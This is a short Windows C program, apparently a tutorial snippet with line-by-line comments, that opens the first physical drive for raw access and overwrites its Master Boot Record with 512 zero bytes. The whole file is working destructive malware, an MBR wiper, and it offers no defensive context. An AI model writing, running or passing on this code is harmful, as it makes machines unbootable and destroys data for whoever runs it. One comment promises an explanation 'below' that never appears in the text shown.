#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>

INT
WINAPI
wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR szCmdLine, _In_ INT nShowCmd)
{
    FILE* fd = fopen("\\\\.\\PHYSICALDRIVE0", "rb+");     /* The meaning of this sentence is explained below*/
    char buffer[512] = { 0 };                             //Define a string and initialize it to clear, because the MBR master has a total of 512 bytes, the size is defined as 512
    fseek(fd, 0, SEEK_SET);                               //Because MBR is stored at 0 cylinder, 0 head, and 1 sector of the disk, we directly offset the file pointer to the beginning of the file, which is the MBR storage location
    fwrite(buffer, 512, 1, fd);                           //Clear the system MBR
    fclose(fd);                                           //Close open handles
    return 0;
}